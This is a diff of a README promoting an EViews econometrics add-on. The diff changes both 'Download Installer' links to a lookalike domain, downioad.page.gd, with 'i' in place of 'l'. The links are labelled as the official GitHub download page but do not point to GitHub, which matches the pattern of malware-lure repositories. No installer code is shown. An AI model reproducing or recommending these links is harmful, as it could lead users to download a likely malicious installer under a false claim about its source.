@@ -2,7 +2,7 @@
 
 The EViews Econometric Tools Suite 2026 is a powerful add-on for EViews, designed to streamline and enhance econometric analysis, forecasting, and data visualization tasks. This suite integrates seamlessly with EViews 2026, providing users with advanced tools for statistical modeling and automated reporting.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Overview
 
@@ -71,6 +71,6 @@ A: Yes, you can reach out to our support team via the GitHub repository or email
 
 For the latest version and updates, visit the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 *Last Updated: December 2026*
